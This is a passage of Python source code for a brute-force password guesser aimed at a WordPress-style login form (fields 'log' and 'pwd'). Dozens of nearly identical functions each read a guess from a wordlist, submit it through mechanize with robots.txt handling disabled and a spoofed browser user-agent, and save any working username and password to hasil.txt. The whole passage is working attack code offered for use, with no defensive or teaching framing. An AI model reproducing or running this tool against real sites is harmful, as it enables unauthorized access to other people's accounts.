    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x16():
    w1=k16.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x17():
    w1=k17.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x18():
    w1=k18.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x19():
    w1=k19.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x20():
    w1=k20.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x21():
    w1=k21.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x22():
    w1=k22.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x23():
    w1=k23.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x24():
    w1=k24.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x25():
    w1=k25.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x26():
    w1=k26.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x27():
    w1=k27.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x28():
    w1=k28.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x29():
    w1=k29.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x30():
    w1=k30.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x31():
    w1=k31.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x32():
    w1=k32.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x33():
    w1=k33.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x34():
    w1=k34.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x35():
    w1=k35.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x36():
    w1=k36.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x37():
    w1=k37.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x38():
    w1=k38.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x39():
    w1=k39.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x40():
    w1=k40.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x41():
    w1=k41.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x42():
    w1=k42.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x43():
    w1=k43.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x44():
    w1=k44.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x45():
    w1=k45.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x46():
    w1=k46.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x47():
    w1=k47.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x48():
    w1=k48.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x49():
    w1=k49.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
